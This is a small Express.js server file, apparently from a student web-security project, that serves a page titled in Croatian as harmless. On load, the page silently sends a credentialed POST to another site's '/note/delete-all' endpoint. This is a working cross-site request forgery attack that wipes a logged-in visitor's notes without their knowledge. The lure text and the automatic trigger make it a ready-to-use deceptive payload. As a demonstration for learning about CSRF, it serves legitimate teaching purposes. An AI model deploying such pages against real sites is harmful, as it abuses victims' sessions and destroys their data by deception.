import express from "express";

const url = "https://web2-projekt2-y3j7.onrender.com";

export const app = express();

app.get("/", (_req, res) => {
  res.send(`
    <body onload="delete_all_malicious()">
    <p>Ovo je bezopasna stranica</p>
    <script>
        async function delete_all_malicious() {
            await fetch("${url}/note/delete-all", {
                method: "POST",
                credentials: "include",
                headers: {
                "Content-type": "application/json",
                },
            });
        }
    </script>
    </body>`);
});

app.listen(5577, () => {
  console.log(`Server locally running at port 5577`);
});
